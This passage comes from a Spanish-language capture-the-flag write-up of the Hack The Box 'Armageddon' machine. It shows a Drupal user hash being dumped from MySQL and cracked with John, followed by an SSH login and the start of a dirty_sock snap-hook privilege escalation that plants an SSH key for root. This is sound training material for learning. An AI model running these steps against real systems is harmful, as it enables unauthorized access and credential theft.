&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;armageddon.htb&amp;gt;&amp;gt; mysql -u drupaluser -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;show databases;&amp;#34;&lt;/span&gt;  
Database                                                                       
information_schema                                                             
drupal                                                                         
mysql                                                                          
performance_schema                                                             
armageddon.htb&amp;gt;&amp;gt; mysql -u drupaluser -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;use drupal; show tables;&amp;#34;&lt;/span&gt;
Tables_in_drupal                                                               
actions                                                                        
authmap                                                                        
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                                                                                     
users                                                                                          
users_roles                                                                                    
variable                                                                                       
watchdog
armageddon.htb&amp;gt;&amp;gt; mysql -u drupaluser -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;use drupal; describe users;&amp;#34;&lt;/span&gt;
Field   Type    Null    Key     Default Extra
uid     int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; unsigned        NO      PRI     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
name    varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;60&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;     NO      UNI
pass    varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;128&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    NO
mail    varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;254&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    YES     MUL
theme   varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    NO
signature       varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    NO
signature_format        varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;255&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    YES             NULL
created int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NO      MUL     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
access  int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NO      MUL     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
login   int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NO              &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
status  tinyint&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;      NO              &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
timezone        varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;     YES             NULL
language        varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;12&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;     NO
picture int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NO      MUL     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
init    varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;254&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    YES
data    longblob        YES             NULL
armageddon.htb&amp;gt;&amp;gt; mysql -u drupaluser -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;use drupal; select uid,name,pass from users;&amp;#34;&lt;/span&gt;
uid     name    pass
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;       brucetherealadmin       &lt;span class=&#34;nv&#34;&gt;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97&lt;/span&gt;.oOsUf1xAhaadURt
armageddon.htb&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;john&#34;&gt;JOHN&lt;/h4&gt;
&lt;p&gt;Utilizamos John para obtener en texto plano la contraseÃ±a.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash_brucetherealadmin
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Drupal7, &lt;span class=&#34;nv&#34;&gt;$S&lt;/span&gt;$ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SHA512 256/256 AVX2 4x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;32768&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
booboo           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-03-28 03:24&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2.000g/s 464.0p/s 464.0c/s 464.0C/s tiffany..harley
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;bruce---user&#34;&gt;BRUCE - USER&lt;/h1&gt;
&lt;p&gt;Ingresamos por el servicio SSH, logrando obtener una shell con el usuario &lt;code&gt;brucetherealadmin&lt;/code&gt; y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ ssh brucetherealadmin@10.129.89.116 &lt;span class=&#34;c1&#34;&gt;# booboo                                                                                                        130 â¨¯&lt;/span&gt;
brucetherealadmin@10.129.89.116&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Last failed login: Sun Mar &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 08:13:18 BST &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.48 on ssh:notty
There was &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; failed login attempt since the last successful login.
Last login: Tue Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 12:40:36 &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; from 10.10.14.2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
brucetherealadmin
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;brucetherealadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;brucetherealadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;brucetherealadmin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
/home/brucetherealadmin
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ls
user.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ cat user.txt&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
69eb27ca88fbbd9
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;El usuario actual puede ejecutar el comando &lt;code&gt;sudo snap install *&lt;/code&gt; por lo que podriamos instalar snaps. Verificamos si exsitia algun paquete instalado y observamos solamente el &lt;code&gt;core&lt;/code&gt;, ademÃ¡s encontramos que la version de snap es la &lt;code&gt;2.47&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ sudo -l -l
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MAIL PS1 PS2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;LC_COLLATE LC_IDENTIFICATION
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;    LC_MEASUREMENT LC_MESSAGES&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;    LC_TELEPHONE&amp;#34;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;env_keep&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;#34;&lt;/span&gt;,
    &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin

User brucetherealadmin may run the following commands on armageddon:

Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
        /usr/bin/snap install *
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ snap list
Name  Version  Rev    Tracking       Publisher   Notes
core  16-2.49  &lt;span class=&#34;m&#34;&gt;10859&lt;/span&gt;  latest/stable  canonicalâ  core
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ snap --version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
centos  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
kernel  3.10.0-1160.6.1.el7.x86_64
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Despues de realizar una busqueda de posibles exploits o vulnerabilidades relacionadas a snap, encontramos &lt;a href=&#34;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&#34;&gt;dirty_sock&lt;/a&gt;, el cual se aprovecha de la instalacion de un snap a traves de la API de snap y la instalacion de hooks, lo que permitirÃ­a obtener acceso privilegiado en el sistema. Existen dos exploits, &lt;code&gt;dirty_sockv1&lt;/code&gt; se aprovecha de la API de snap para la creacion de un usuario utilizando una cuenta de Ubuntu SSO aunque es necesario que la maquina tenga acceso a internet. &lt;code&gt;dirty_sockv2&lt;/code&gt; en este, se utilizan los hooks de snap para ejecutar comandos cuando un paquete es instalado en modo &lt;code&gt;devmode&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;hellip; snaps have something called âhooksâ. One such hook, the âinstall hookâ is run at the time of snap installation and can be a simple shell script. If the snap is configured in âdevmodeâ, then this hook will be run in the context of root.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;En esta maquina al poder instalar paquetes mediante &lt;code&gt;sudo&lt;/code&gt; los hooks se estarÃ­an ejecutando como &lt;code&gt;root&lt;/code&gt;. Creamos nuestro propio paquete utilizando los comandos de &lt;a href=&#34;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&#34;&gt;&lt;code&gt;dirtysockv2&lt;/code&gt; de este post&lt;/a&gt;, aunque a diferencia de este agregamos la clave publica del usuario &lt;code&gt;brucetherealadmin&lt;/code&gt; al archivo &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; en el script &lt;code&gt;snap/hooks/install&lt;/code&gt;, para poder tener acceso a traves de SSH en localhost.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/home/brucetherealadmin/.ssh/id_rsa&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: 
Created directory &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/brucetherealadmin/.ssh&amp;#39;&lt;/span&gt;.
Enter passphrase &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;empty &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; no passphrase&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: 
Enter same passphrase again: 
Your identification has been saved in /home/brucetherealadmin/.ssh/id_rsa.
Your public key has been saved in /home/brucetherealadmin/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:DjcytDVT0BIUbXeGj0gziVxCQXuKut8Qzdkkd4iRMcE brucetherealadmin@armageddon.htb
The key&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s randomart image is:
+---&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RSA 2048&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;----+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       *#&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;o. .   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;        EBO.o o  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      . &lt;span class=&#34;nv&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+==&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     . * @... .  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      B S .      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     . B .       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    . . .        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     . o         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    ... .        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SHA256&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-----+
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ cat ~/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEXyP4V63iTvxbzKeHw4loojfsZHI0hWLwDnaE043yxtsvItYh7JGQf5SkTjFHe2LOuDSrEL0u8OFQAZvIwubxmeqfuGIBXOoZRQKyfCA8bayCce9w2MdG9w1xX4dZZ45ht38Y17EWvZipxyOVMZQYuld3aBs5S5FV8Ii6r3HTpLOvhXMHxoti9NAr6wAxbcNKA28lNYriCgAsNvGW8ieIrhIw44luU9nZaNS4NfRkuLLh2/Bii0axUA1f0ZkhTOtIWk0REMQALDJrfgvjV+5b+EQGgfsQ8/dvzy7tWPargurCFTSQwCuHXHs+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Hay que mencionar que es posible ejecutar algun otro tipo de comando en el hook, tambien, el script original del hook no funciona en esta maquina para obtener acceso &lt;code&gt;privilegiado&lt;/code&gt; ya que no existe el grupo &lt;code&gt;sudo&lt;/code&gt; en la maquina.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;En caso de algun tipo de error utilizar &lt;code&gt;#!/bin/sh -e&lt;/code&gt; en lugar de &lt;code&gt;#!/bin/bash&lt;/code&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Creamos el snap con los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
